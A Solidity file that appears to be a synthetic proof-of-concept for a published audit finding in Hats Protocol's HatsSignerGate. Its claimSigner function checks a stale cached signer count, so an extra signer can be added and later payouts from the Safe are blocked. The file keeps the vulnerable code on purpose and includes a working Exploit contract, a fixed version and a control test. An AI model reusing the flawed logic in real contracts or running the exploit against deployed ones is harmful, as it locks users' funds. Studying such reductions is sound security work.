// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Hats Protocol — HatsSignerGate.claimSigner (Sherlock 2023-02-hats, H-8)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: claimSigner compares the cached signerCount, not the live
    valid-signer count, and never calls reconcileSignerCount. A wearer can be
    swapped in until more valid signers exist than maxSigners. The next
    reconcile, which checkTransaction runs before every safe exec, then
    reverts MaxSignersReached. A payout that meets the current threshold
    never moves, and the safe keeps the tokens.
    Vulnerable lines preserved from HatsSignerGate / HatsSignerGateBase
    (hats-zodiac @ 9455cc0957762f5dbbd8e62063d970199109b977).
    maxSigners is 2 here; the report's 10 -> 11 case is the same comparison.
    Listed signer addresses stand in for Safe approved-hash signatures. */

contract Token {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Safe {
    address internal constant SENTINEL = address(0x1);
    mapping(address => address) public owners;
    uint256 public ownerCount;
    uint256 internal threshold;
    address public guard;

    function init(address[] calldata initial, uint256 threshold_, address guard_) external {
        require(ownerCount == 0, "init");
        address prev = SENTINEL;
        for (uint256 i; i < initial.length; i++) {
            owners[prev] = initial[i];
            prev = initial[i];
        }
        owners[prev] = SENTINEL;
        ownerCount = initial.length;
        threshold = threshold_;
        guard = guard_;
    }

    function getThreshold() public view returns (uint256) {
        return threshold;
    }

    function isOwner(address account) public view returns (bool) {
        return account != SENTINEL && account != address(0) && owners[account] != address(0);
    }

    function getOwners() public view returns (address[] memory list) {
        list = new address[](ownerCount);
        address cur = owners[SENTINEL];
        for (uint256 i; i < ownerCount; i++) {
            list[i] = cur;
            cur = owners[cur];
        }
    }

    function addOwnerWithThreshold(address owner, uint256 newThreshold) external {
        require(msg.sender == address(this), "self");
        require(owners[owner] == address(0), "owner");
        owners[owner] = owners[SENTINEL];
        owners[SENTINEL] = owner;
        unchecked {
            ownerCount += 1;
        }
        threshold = newThreshold;
    }

    function swapOwner(address prev, address oldOwner, address newOwner) external {
        require(msg.sender == address(this), "self");
        require(owners[prev] == oldOwner, "prev");
        require(owners[newOwner] == address(0), "new");
        owners[newOwner] = owners[oldOwner];
        owners[prev] = newOwner;
        owners[oldOwner] = address(0);
    }

    function changeThreshold(uint256 newThreshold) external {
        require(msg.sender == address(this), "self");
        require(newThreshold > 0 && newThreshold <= ownerCount, "threshold");
        threshold = newThreshold;
    }

    function execTransactionFromModule(address to, uint256, bytes calldata data, uint8) external returns (bool success) {
        require(msg.sender == guard, "module");
        (success,) = to.call(data);
    }

    function execTransaction(address to, bytes calldata data, bytes calldata signatures) external returns (bool) {
        HatsSignerGate(guard).checkTransaction(signatures);
        (bool ok, bytes memory ret) = to.call(data);
        if (!ok) {
            assembly {
                revert(add(ret, 32), mload(ret))
            }
        }
        return true;
    }
}

contract Caller {
    function callClaim(HatsSignerGate gate) external {
        gate.claimSigner();
    }
}

contract HatsSignerGate {
    error MaxSignersReached();
    error SignerAlreadyClaimed(address signer);
    error NotSignerHatWearer(address signer);
    error NoInvalidSignersToReplace();
    error FailedExecRemoveSigner();
    error FailedExecChangeThreshold();
    error NotCalledFromSafe();
    error InvalidSigners();

    address internal constant SENTINEL_OWNERS = address(0x1);

    Safe public safe;
    uint256 public maxSigners;
    uint256 public targetThreshold;
    uint256 public minThreshold;
    uint256 public signerCount;
    address public hatAdmin;
    mapping(address => bool) public wearsHat;

    constructor(Safe _safe, uint256 _max, uint256 _target, uint256 _min) {
        safe = _safe;
        maxSigners = _max;
        targetThreshold = _target;
        minThreshold = _min;
        hatAdmin = msg.sender;
    }

    function initSignerCount(uint256 n) external {
        require(msg.sender == hatAdmin, "hatAdmin");
        require(signerCount == 0, "once");
        signerCount = n;
    }

    function setWearer(address account, bool wears) external {
        require(msg.sender == hatAdmin, "hatAdmin");
        wearsHat[account] = wears;
    }

    function isValidSigner(address account) public view returns (bool) {
        return wearsHat[account];
    }

    function liveValidSigners() public view returns (uint256) {
        return _countValidSigners(safe.getOwners());
    }

    function claimSigner() public virtual {
        uint256 maxSigs = maxSigners; // save SLOADs
        uint256 currentSignerCount = signerCount;

        // @> VULN: cached signerCount is not the live valid-signer count, so this does not stop the swap
        if (currentSignerCount >= maxSigs) {
            revert MaxSignersReached();
        }

        if (safe.isOwner(msg.sender)) {
            revert SignerAlreadyClaimed(msg.sender);
        }

        if (!isValidSigner(msg.sender)) {
            revert NotSignerHatWearer(msg.sender);
        }

        address[] memory owners_ = safe.getOwners();
        uint256 ownerCount = owners_.length;

        if (ownerCount >= maxSigs) {
            bool swapped = _swapSigner(owners_, ownerCount, maxSigs, currentSignerCount, msg.sender);
            if (!swapped) {
                revert NoInvalidSignersToReplace();
            }
        } else {
            _grantSigner(owners_, currentSignerCount, msg.sender);
        }
    }

    function reconcileSignerCount() public {
        address[] memory owners_ = safe.getOwners();
        uint256 validSignerCount = _countValidSigners(owners_);

        // @> VULN: more valid signers than maxSigners reverts, so checkTransaction can no longer exec
        if (validSignerCount > maxSigners) {
            revert MaxSignersReached();
        }

        signerCount = validSignerCount;

        uint256 currentThreshold = safe.getThreshold();
        uint256 newThreshold;
        uint256 target = targetThreshold;

        if (validSignerCount <= target && validSignerCount != currentThreshold) {
            newThreshold = validSignerCount;
        } else if (validSignerCount > target && currentThreshold < target) {
            newThreshold = target;
        }
        if (newThreshold > 0) {
            bytes memory data = abi.encodeWithSignature("changeThreshold(uint256)", validSignerCount);
            bool success = safe.execTransactionFromModule(address(safe), 0, data, 0);
            if (!success) {
                revert FailedExecChangeThreshold();
            }
        }
    }

    function checkTransaction(bytes calldata signatures) external {
        if (msg.sender != address(safe)) revert NotCalledFromSafe();

        // ensure that safe threshold is correct — this is what bricks the payout
        reconcileSignerCount();

        uint256 validSigCount = _countListedSigners(signatures);
        if (validSigCount < safe.getThreshold() || validSigCount < minThreshold) {
            revert InvalidSigners();
        }
    }

    function _countValidSigners(address[] memory owners_) internal view returns (uint256 validSignerCount) {
        uint256 length = owners_.length;
        for (uint256 i; i < length;) {
            if (isValidSigner(owners_[i])) {
                unchecked {
                    ++validSignerCount;
                }
            }
            unchecked {
                ++i;
            }
        }
    }

    function _countListedSigners(bytes calldata signatures) internal view returns (uint256 validSigCount) {
        address[] memory listed = abi.decode(signatures, (address[]));
        for (uint256 i; i < listed.length; i++) {
            if (isValidSigner(listed[i])) {
                unchecked {
                    ++validSigCount;
                }
            }
        }
    }

    function _grantSigner(address[] memory, uint256 _currentSignerCount, address _signer) internal {
        uint256 newSignerCount = _currentSignerCount + 1;
        signerCount = newSignerCount;
        bytes memory data = abi.encodeWithSignature("addOwnerWithThreshold(address,uint256)", _signer, newSignerCount);
        bool success = safe.execTransactionFromModule(address(safe), 0, data, 0);
        require(success, "grant");
    }

    function _swapSigner(
        address[] memory _owners,
        uint256 _ownerCount,
        uint256 _maxSigners,
        uint256 _currentSignerCount,
        address _signer
    ) internal returns (bool success) {
        address ownerToCheck;
        bytes memory data;
        for (uint256 i; i < _ownerCount - 1;) {
            ownerToCheck = _owners[i];
            if (!isValidSigner(ownerToCheck)) {
                data = abi.encodeWithSignature(
                    "swapOwner(address,address,address)",
                    _findPrevOwner(_owners, ownerToCheck),
                    ownerToCheck,
                    _signer
                );
                success = safe.execTransactionFromModule(address(safe), 0, data, 0);
                if (!success) {
                    revert FailedExecRemoveSigner();
                }
                if (_currentSignerCount < _maxSigners) ++signerCount;
                break;
            }
            unchecked {
                ++i;
            }
        }
    }

    function _findPrevOwner(address[] memory _owners, address _owner) internal pure returns (address prevOwner) {
        prevOwner = SENTINEL_OWNERS;
        for (uint256 i; i < _owners.length;) {
            if (_owners[i] == _owner) {
                if (i == 0) break;
                prevOwner = _owners[i - 1];
            }
            unchecked {
                ++i;
            }
        }
    }
}

/// Recommended fix: reconcile before reading signerCount, so the max is the live count.
contract HatsSignerGateFixed is HatsSignerGate {
    constructor(Safe _safe, uint256 _max, uint256 _target, uint256 _min) HatsSignerGate(_safe, _max, _target, _min) {}

    function claimSigner() public override {
        reconcileSignerCount();
        super.claimSigner();
    }
}

abstract contract HatScenario {
    address public constant A = 0x00000000000000000000000000000000000000A1;
    address public constant B = 0x00000000000000000000000000000000000000b2;
    address public constant C = 0x00000000000000000000000000000000000000C3;
    address public constant PAYEE = 0x2222222222222222222222222222222222222222;
    uint256 public constant LOCKED = 1000 ether;

    Token public token;
    Safe public safe;
    HatsSignerGate public gate;
    Caller public claimant;

    function _wire(bool fixedGate) internal {
        token = new Token();
        safe = new Safe();
        if (fixedGate) {
            gate = new HatsSignerGateFixed(safe, 2, 2, 1);
        } else {
            gate = new HatsSignerGate(safe, 2, 2, 1);
        }
        claimant = new Caller();
        address[] memory initial = new address[](2);
        initial[0] = A;
        initial[1] = B;
        safe.init(initial, 2, address(gate));
        gate.initSignerCount(2);
        gate.setWearer(A, true);
        gate.setWearer(B, true);
        gate.setWearer(address(claimant), true);
    }

    function _twoSigs() internal pure returns (bytes memory) {
        address[] memory two = new address[](2);
        two[0] = A;
        two[1] = B;
        return abi.encode(two);
    }

    function _oneSig() internal pure returns (bytes memory) {
        address[] memory one = new address[](1);
        one[0] = A;
        return abi.encode(one);
    }

    function _addInvalidOwner() internal {
        bytes memory data = abi.encodeWithSignature("addOwnerWithThreshold(address,uint256)", C, safe.getThreshold());
        safe.execTransaction(address(safe), data, _twoSigs());
    }

    function _dropAndReconcile() internal {
        gate.setWearer(A, false);
        gate.reconcileSignerCount();
        gate.setWearer(A, true);
    }
}

contract Exploit is HatScenario {
    constructor() {
        _wire(false);
    }

    function run() external {
        token.mint(address(safe), LOCKED);
        _addInvalidOwner();
        _dropAndReconcile();
        require(gate.signerCount() == 1, "cache");
        require(gate.liveValidSigners() == 2, "live");
        claimant.callClaim(gate);
        require(gate.liveValidSigners() == 3, "third");
        require(gate.maxSigners() == 2, "max");
        bytes memory payout = abi.encodeWithSignature("transfer(address,uint256)", PAYEE, LOCKED);
        (bool paid,) = address(safe).call(
            abi.encodeWithSignature("execTransaction(address,bytes,bytes)", address(token), payout, _oneSig())
        );
        require(!paid, "payout passed");
        uint256 stuck = token.balanceOf(address(safe));
        require(stuck == LOCKED, "safe drained");
        require(token.balanceOf(PAYEE) == 0, "payee paid");
    }
}

contract ControlExploit is HatScenario {
    constructor() {
        _wire(true);
    }

    function run() external {
        token.mint(address(safe), LOCKED);
        _addInvalidOwner();
        _dropAndReconcile();
        (bool claimed,) =
            address(claimant).call(abi.encodeWithSignature("callClaim(address)", address(gate)));
        require(!claimed, "max not enforced");
        require(gate.liveValidSigners() == 2, "still two");
        bytes memory payout = abi.encodeWithSignature("transfer(address,uint256)", PAYEE, LOCKED);
        safe.execTransaction(address(token), payout, _twoSigs());
        require(token.balanceOf(PAYEE) == LOCKED, "payee");
        require(token.balanceOf(address(safe)) == 0, "safe");
        require(gate.liveValidSigners() <= gate.maxSigners(), "over max");
    }
}
